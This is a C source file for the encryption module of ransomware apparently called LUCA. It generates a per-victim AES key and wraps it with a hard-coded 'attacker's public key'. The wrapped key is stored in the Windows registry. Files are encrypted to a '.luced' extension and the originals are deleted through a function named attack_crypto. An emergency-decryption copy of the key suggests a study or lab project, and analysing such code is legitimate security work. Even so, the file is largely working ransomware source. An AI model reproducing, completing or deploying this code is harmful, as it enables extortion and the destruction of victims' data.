/*  This file contains the code for the Encryption Module of LUCA. It provides methods for file encryption, 
    AES key generation and encryption and file deletion. */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include "mbedtls/aes.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "mbedtls/pk.h"
#include "mbedtls/rsa.h"
#include "mbedtls/md.h"

#include "get_relative_path.h"
#include "store_in_register.h"

#define REG_PATH "Software\\LUCAware"
#define REG_ENCRYPTED_KEY "EnKey"

/* Constant values for AES 128 */
#define KEY_SIZE    16 
#define IV_SIZE     16
#define BUFFER_SIZE 4096

/* Global state variables */

// AES key
static unsigned char aes_key[KEY_SIZE];
static bool key_loaded = false;
// mbedtls state
static mbedtls_entropy_context entropy;
static mbedtls_ctr_drbg_context ctr_drbg;
static bool rng_initialized = false;

/* Attacker's public key - RSA 1024 */
unsigned char public_key_der[] = {
  0x30, 0x81, 0x9f, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
  0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x81, 0x8d, 0x00, 0x30, 0x81,
  0x89, 0x02, 0x81, 0x81, 0x00, 0xe7, 0x64, 0x21, 0x9d, 0x74, 0xe3, 0xdd,
  0xf2, 0x14, 0xa3, 0x2c, 0xb4, 0x05, 0xf4, 0x87, 0x1f, 0xe0, 0x6c, 0x09,
  0x4a, 0xa1, 0x27, 0xe2, 0x17, 0x36, 0x7b, 0x5a, 0x69, 0x1b, 0xc5, 0x0d,
  0xe6, 0x31, 0x01, 0xcd, 0x2c, 0xbc, 0xce, 0xdb, 0x6c, 0x0d, 0x8b, 0xa4,
  0xa3, 0x56, 0x0b, 0xe5, 0xbe, 0xf8, 0x4e, 0xf7, 0xe5, 0xeb, 0xfb, 0x79,
  0x9c, 0x50, 0x54, 0x1f, 0x4a, 0x23, 0xf1, 0x41, 0xc3, 0x58, 0x60, 0xf2,
  0xef, 0xe1, 0x29, 0x4c, 0x7f, 0xfb, 0xc5, 0xdb, 0xfa, 0xb1, 0xcb, 0x81,
  0x9c, 0x71, 0x0f, 0x61, 0x8b, 0x55, 0x20, 0xc6, 0x64, 0xb5, 0xc3, 0xde,
  0x58, 0x62, 0x92, 0x22, 0x51, 0x19, 0x0a, 0x54, 0x2a, 0x65, 0x46, 0xe8,
  0x04, 0xaa, 0x0e, 0x2f, 0x3b, 0x96, 0x96, 0x79, 0xc1, 0x92, 0xf5, 0x43,
  0xb4, 0x68, 0xe6, 0xe0, 0xeb, 0x3f, 0xab, 0x51, 0xdd, 0xfd, 0xe9, 0xa8,
  0x1f, 0x02, 0x03, 0x01, 0x00, 0x01
};
unsigned int public_key_der_len = 162;

/* Error handling */
static void handle_error(const char *msg) {
    fprintf(stderr, "Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

/* Initialize the mbedtls state */
static void rng_init(void) {
    const char *pers = "aes_file_encryptor";

    if (rng_initialized)
        return;

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    if (mbedtls_ctr_drbg_seed(
            &ctr_drbg,
            mbedtls_entropy_func,
            &entropy,
            (const unsigned char *)pers,
            strlen(pers)) != 0)
    {
        handle_error("RNG initialization failed");
    }

    rng_initialized = true;
}

/* Write random bytes for key and IVs */
static void random_bytes(unsigned char *buf, size_t len) {
    rng_init();
    if (mbedtls_ctr_drbg_random(&ctr_drbg, buf, len) != 0)
        handle_error("Random generation failed");
}

/* Encrypt AES key with hard-coded public RSA key */
static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len) {
    mbedtls_pk_context pk;
    mbedtls_pk_init(&pk);

    // Parse public key
    if (mbedtls_pk_parse_public_key(&pk, public_key_der, public_key_der_len) != 0)
        handle_error("Failed to parse RSA public key");

    if (!mbedtls_pk_can_do(&pk, MBEDTLS_PK_RSA))
        handle_error("Public key is not RSA");

    mbedtls_rsa_context *rsa = mbedtls_pk_rsa(pk);

    // Set PKCS#1 v1.5 padding
    if (mbedtls_rsa_set_padding(rsa, MBEDTLS_RSA_PKCS_V15, 0) != 0)
        handle_error("Failed to set RSA PKCS#1 v1.5 padding");

    size_t rsa_len = mbedtls_pk_get_len(&pk);

    // Allocate memory for encrypted AES key
    unsigned char *cipher = malloc(rsa_len);
    if (!cipher)
        handle_error("malloc failed");

    // Key encryption
    if (mbedtls_rsa_pkcs1_encrypt(rsa, mbedtls_ctr_drbg_random, &ctr_drbg, key_len, key, cipher) != 0) {
        free(cipher);
        handle_error("RSA PKCS#1 encryption failed");
    }

    // Save encrypted key in Registry
    storage_context_t ctx = { REG_PATH };
    if (store_value(&ctx, REG_ENCRYPTED_KEY, cipher, rsa_len) != 0) {
        free(cipher);
        handle_error("Failed to store encrypted AES key in registry");
    }

    /* SECURITY MECHANISM - SAVE KEY TO .BIN TO ALLOW EMERGENCY DECRYPTION */
    char aes_bin[MAX_PATH];
    if (get_relative_path(aes_bin, sizeof(aes_bin), "aes_enc.bin") != 0) {
        return 1;
    }
    FILE *fp = fopen(aes_bin, "wb");
    if (!fp)
        handle_error("Failed to open .bin file for writing");

    if (fwrite(cipher, 1, rsa_len, fp) != rsa_len) {
        fclose(fp);
        handle_error("Failed to write encrypted key to .bin file");
    }

    fclose(fp);
    
    // Cleanup
    free(cipher);
    mbedtls_pk_free(&pk);
}

/* Initialize AES key for the whole session */
static int ensure_aes_key_loaded(void) {
    // Only initialize once per victim
    if (key_loaded)
        return 0;

    // Initialize mbedtls
    rng_init();

    // Generate AES key once per victim
    random_bytes(aes_key, KEY_SIZE);

    // Encrypt and save the key
    save_encrypted_key_rsa(aes_key, KEY_SIZE);

    key_loaded = true;
    return 0;
}

/* Encrypt one file */
void encrypt_file_aes_ctr(const char *source, const char *target, const unsigned char *key) {
    // Open input and output files
    FILE *in = fopen(source, "rb");
    if (!in)
        handle_error("Cannot open input file");

    FILE *out = fopen(target, "wb");
    if (!out)
        handle_error("Cannot open output file");

    // Variables for keys and stream
    unsigned char iv[IV_SIZE];
    unsigned char nonce_counter[IV_SIZE];
    unsigned char stream_block[16] = {0};
    size_t nc_off = 0;

    // Setup IV for every file
    random_bytes(iv, IV_SIZE);
    memcpy(nonce_counter, iv, IV_SIZE);

    // Write IV at start of file
    if (fwrite(iv, 1, IV_SIZE, out) != IV_SIZE)
        handle_error("Failed to write IV");

    // Setup mbedtls AES contex
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);

    if (mbedtls_aes_setkey_enc(&aes, key, 128) != 0)
        handle_error("AES key setup failed");

    // Encryption with AES 128 CTR
    unsigned char buffer[BUFFER_SIZE];
    size_t n;

    while ((n = fread(buffer, 1, BUFFER_SIZE, in)) > 0)
    {
        if (mbedtls_aes_crypt_ctr(&aes, n, &nc_off, nonce_counter, stream_block, buffer, buffer) != 0)
        {
            handle_error("AES-CTR encryption failed");
        }

        if (fwrite(buffer, 1, n, out) != n)
            handle_error("Failed to write encrypted data");
    }

    // Cleanup
    mbedtls_aes_free(&aes);
    fclose(in);
    fclose(out);
}

/* Create output file path for encrypted document */
int make_enc_path(const char *input, char *output, size_t output_size) {
    // Validate input
    if (!input || !output)
        return -1;

    size_t len = strlen(input);

    // Check buffer size
    if (len + 7 > output_size) { /* +6 for ".luced", +1 for '\0' */
        return -1;
    }

    memcpy(output, input, len);
    strcpy(output + len, ".luced");

    return 0;
}

/* Delete the original file after encryption */
int delete_file_after_encrypt(const char *path) {
    HANDLE h = CreateFileA(
        path,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (h != INVALID_HANDLE_VALUE) {
        FlushFileBuffers(h);
        CloseHandle(h);
    }

    if (!DeleteFileA(path)) {
        return -1; // failed
    }

    return 0; // success
}

/* Public API for cleaning the critical memory - plaintext AES key and mbedtls state variables */
void crypto_cleanup(void) {
    memset(aes_key, 0, sizeof(aes_key));
    mbedtls_ctr_drbg_free(&ctr_drbg);
    mbedtls_entropy_free(&entropy);
    rng_initialized = false;
    key_loaded = false;
}

/* Public API for encryption */
int attack_crypto(const char *input_file) {
    // Ensure AES key is loaded
    ensure_aes_key_loaded();

    // Create output path
    char output_file[MAX_PATH];
    if (make_enc_path(input_file, output_file, sizeof(output_file)) != 0) {
        return -1;
    }

    // Encrypt
    encrypt_file_aes_ctr(input_file, output_file, aes_key);

    // Delete original file
    if (delete_file_after_encrypt(input_file) != 0) {
        return -1;
    }

    return 0;
}
